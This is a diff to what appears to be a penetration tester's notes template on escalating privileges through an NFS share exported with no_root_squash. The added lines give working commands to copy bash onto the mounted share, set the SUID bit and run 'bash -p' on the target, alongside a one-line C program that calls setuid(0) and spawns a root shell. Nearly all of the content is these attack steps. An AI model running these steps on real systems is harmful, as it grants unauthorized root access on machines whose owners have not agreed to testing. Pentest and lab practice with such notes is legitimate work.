@@ -13,6 +13,20 @@ sudo mount -t nfs -o nolock,nfsvers=3 <% tp.frontmatter.target_ip %>:/<target_sh
 ### No Root squashing
 This sometimes works to escalate privileges 
 
+```bash
+sudo cp /bin/bash <mount/location>/bash
+```
+
+```bash
+sudo chmod +s <mount/location>/bash
+```
+
+On target machine
+```bash
+<path/to/file>/bash -p
+```
+
+OR
 Create `.c` file
 ```bash
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > ./x.c
@@ -27,3 +41,7 @@ sudo gcc ./x.c -o <mount/location>/x
 sudo chmod +s </mount/location>/x
 ```
 
+On target machine
+```bash
+<path/to/file>/x
+```
